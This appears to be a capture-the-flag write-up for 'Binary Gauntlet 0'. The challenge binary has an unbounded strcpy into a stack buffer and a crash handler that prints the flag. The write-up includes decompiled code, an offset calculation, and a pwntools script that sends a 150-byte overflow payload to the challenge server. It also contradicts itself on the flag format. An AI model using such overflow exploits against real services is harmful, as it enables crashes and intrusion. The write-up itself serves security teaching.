# CyLab — Binary Gauntlet 0

* **Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [pwn.college](https://pwn.college/)  
* **Category:** Binary Exploitation (Pwn / Crash Trigger)  
* **Difficulty:** Easy (CyLab 2)  
* **Date:** 2026-11-09  
* **Tools:** `file`, `checksec`, IDA Pro, `gdb` + `pwndbg`, `pwntools`, Python 3  
* **Binary:** 64-bit ELF (`gauntlet`) — Non-PIE, Stack Executable  

---

## TL;DR

The introductory challenge in the Binary Gauntlet mitigation progression series. The program reads `flag.txt` into a global buffer upon startup and registers a custom signal handler (`sigsegv_handler`) that automatically prints the flag whenever a `SIGSEGV` crash occurs. In `main()`, user input is read into a large heap buffer via `fgets()` and copied into a 120-byte local stack buffer using an unbounded `strcpy()`. Because compiler stack canaries are absent, delivering any payload longer than 128 bytes overwrites the saved return address (`saved RIP`) with an invalid pointer, triggering an immediate segmentation fault and printing the raw flag.

---

## Recon

We inspect the binary's properties and security mitigations using `file` and `checksec`:

```bash
$ file gauntlet
gauntlet: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, not stripped

$ checksec gauntlet
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
```

Key observations:
* **File Type:** ELF 64-bit LSB (x86-64), dynamically linked, not stripped.
* **Canary:** `No canary found` — Stack buffer overflow does not trigger `__stack_chk_fail`.
* **NX:** `NX disabled` — Stack memory has read-write-execute permissions (RWX).
* **PIE:** `No PIE (0x400000)` — Executable base addresses are static.
* **Flag Format:** Per challenge documentation, Gauntlet series flags are raw 32-character hexadecimal strings without the `academy{}` wrapper.

---

## Static Analysis & Vulnerability

### 1. Decompilation in IDA Pro

Decompiling `main()`:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char dest[120]; // [rsp+0h] [rbp-78h] BYREF
  char *heap_buf; // [rsp+78h] [rbp+0h]

  heap_buf = (char *)malloc(1000);
  f = fopen("flag.txt", "r");
  fgets(flag_global, 64, f);
  signal(SIGSEGV, sigsegv_handler);  // <-- Handler prints flag_global on crash!

  fgets(heap_buf, 1000, stdin);
  strcpy(dest, heap_buf);            // <-- Unbounded strcpy into 120-byte stack buffer!
  return 0;
}
```

Examining `sigsegv_handler()`:
```c
void sigsegv_handler(int sig)
{
  puts(flag_global);
  exit(0);
}
```

### 2. Disassembly & Vulnerability Root Cause

1. `dest` buffer resides at `[rbp-0x78]` (120 bytes in size).
2. `strcpy(dest, heap_buf)` copies up to 1,000 bytes from `heap_buf` into `dest` without checking bounds.
3. Overflowing past 128 bytes overwrites `saved RIP` with invalid memory (e.g., `0x4141414141414141`), causing the CPU to fault upon executing `ret`.
4. The OS delivers `SIGSEGV` to the process, invoking `sigsegv_handler()` to output the flag.

### 3. Stack Memory Layout

```text
  Lower Memory Addresses
  +-----------------------------------+  <- [rbp - 0x78] (Start of dest: 120 bytes)
  |                                   |
  |     dest buffer (120 bytes)       |
  |                                   |
  +-----------------------------------+  <- [rbp] (Saved RBP: 8 bytes)
  |     Saved RBP (8 bytes)           |
  +-----------------------------------+  <- [rbp + 0x08] (Saved RIP)
  |     Return Address (Saved RIP)    |  <- Overwritten to trigger SIGSEGV!
  +-----------------------------------+
  Higher Memory Addresses
```

- Offset to `saved RIP`:
  $$\text{Offset} = 0x78 + 0x08 = 0x80 = 128 \text{ bytes}$$

---

## Dynamic Analysis & Exploitation Strategy

* We deliver 150 bytes of `'A'` characters followed by a newline:
  $$\text{Payload} = \text{b"A"} \times 150 + \text{b"\n"}$$
* `dest` is filled, `saved RBP` is corrupted, and `saved RIP` is smashed with `0x4141414141414141`.
* `main()` executes `leave; ret` $\rightarrow$ crashes with `SIGSEGV` $\rightarrow$ `sigsegv_handler()` prints `flag_global`.

---

## Exploit

We construct the exploit with `pwntools`:

```python
#!/usr/bin/env python3
"""
CyLab — Binary Gauntlet 0
Exploit: Stack buffer overflow triggering SIGSEGV signal handler
"""

from pwn import *

EXE = "./gauntlet"
HOST = args.HOST or "xebec.cylabacademy.net"
PORT = int(args.PORT or 45957)

def main():
    p = remote(HOST, PORT) if args.REMOTE else process(EXE)

    # Send 150 bytes to smash saved RIP and trigger SIGSEGV handler
    payload = b"A" * 150
    p.sendline(payload)

    output = p.recvall(timeout=3).decode(errors="replace")
    print(output)

if __name__ == "__main__":
    main()
```

*(The complete script is saved in [`exploit.py`](exploit.py)).*

---

## Flag

Running the exploit crashes the return instruction and yields the raw flag:

```text
academy{redacted}
```

> **Flag:** `academy{redacted}` *(Raw 32-character hexadecimal flag redacted per disclosure guidelines)*.

---

## Key Takeaways & Lessons

1. **Dangerous Signal Handlers**: Registering signal handlers (`SIGSEGV`, `SIGILL`) that disclose sensitive data or attempt graceful recovery creates a direct exploit path via intentional crashing.
2. **Unsafe String Functions (`strcpy`)**: `strcpy()` does not verify destination buffer sizes. Replacing it with `strncpy()` or `strlcpy()` prevents stack frame corruption.
3. **Defense-in-Depth Mitigations**: Without Stack Canaries or Address Space Layout Randomization (PIE), basic stack overflows can reliably hijack or destabilize execution.
